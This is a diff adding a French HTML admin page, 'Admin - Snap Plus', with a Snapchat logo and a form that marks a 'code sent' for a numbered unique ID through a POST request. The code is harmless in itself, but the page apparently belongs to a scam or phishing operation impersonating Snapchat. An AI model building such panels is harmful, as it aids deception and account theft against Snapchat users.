@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Snap Plus</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="canva-snapchat-logo-MAGzZ1jpOSg.png" alt="Snapchat Logo" class="logo">
+            <h1>Admin - Envoyer Code</h1>
+            
+            <div class="input-group">
+                <label for="uniqueId">ID Unique</label>
+                <input 
+                    type="text" 
+                    id="uniqueId" 
+                    name="uniqueId" 
+                    placeholder="Ex: 0001"
+                    required
+                >
+            </div>
+            
+            <button id="sendCodeBtn" class="btn btn-primary">📤 Code envoyé</button>
+            
+            <div id="statusMessage" class="error-message"></div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('sendCodeBtn').addEventListener('click', async function() {
+            const uniqueId = document.getElementById('uniqueId').value;
+            const statusMessage = document.getElementById('statusMessage');
+            
+            if (!uniqueId) {
+                statusMessage.textContent = 'Veuillez entrer un ID unique';
+                statusMessage.style.display = 'block';
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/code-sent/${uniqueId}`, {
+                    method: 'POST'
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    statusMessage.textContent = '✅ Code envoyé avec succès!';
+                    statusMessage.style.background = '#d4edda';
+                    statusMessage.style.borderColor = '#c3e6cb';
+                    statusMessage.style.color = '#155724';
+                    statusMessage.style.display = 'block';
+                } else {
+                    statusMessage.textContent = 'Erreur lors de l\'envoi du code';
+                    statusMessage.style.display = 'block';
+                }
+            } catch (error) {
+                statusMessage.textContent = 'Erreur: ' + error.message;
+                statusMessage.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
